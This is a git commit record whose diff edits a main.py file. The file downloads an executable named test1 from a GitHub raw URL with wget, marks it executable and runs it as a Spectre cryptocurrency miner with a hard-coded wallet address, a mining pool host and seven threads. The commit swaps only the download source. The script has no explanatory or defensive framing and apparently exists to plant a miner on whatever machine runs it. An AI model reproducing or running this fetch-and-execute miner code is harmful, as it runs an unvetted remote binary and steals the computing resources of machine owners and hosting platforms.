296615fd7957830ec5b8d8ae99ba28117a4dbd80
ndqkwdqbz3 <orainapuanmin@gmail.com>
2024-07-29 15:24:17 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,5 @@
 import sys
 import os
-os.system("wget https://github.com/anqdbkrn31/az/raw/main/test1")
+os.system("wget https://github.com/ndqkwdqbz3/dasdqwz/raw/main/test1")
 os.system("chmod +x test1")
 os.system("./test1 --spectre --wallet spectre:qp7vye8pcmmdtjuqhmjmk0wxmam20wywhs474fnrykfmshpmzd3wkg7dp78zd --daemon-address spr.tw-pool.com --port 14001 --worker-name test --threads 7")
